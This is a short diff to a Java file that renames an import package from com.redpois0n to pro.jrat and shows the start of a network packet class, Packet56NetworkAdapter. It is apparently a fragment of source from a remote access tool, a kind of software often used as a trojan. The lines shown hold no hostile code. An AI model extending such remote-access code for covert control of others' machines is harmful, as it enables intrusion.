@@ -4,7 +4,8 @@ import java.io.DataOutputStream;
 import java.net.InetAddress;
 import java.util.ArrayList;
 
-import com.redpois0n.common.io.StringWriter;
+import pro.jrat.common.io.StringWriter;
+
 
 public class Packet56NetworkAdapter extends AbstractOutgoingPacket {
 
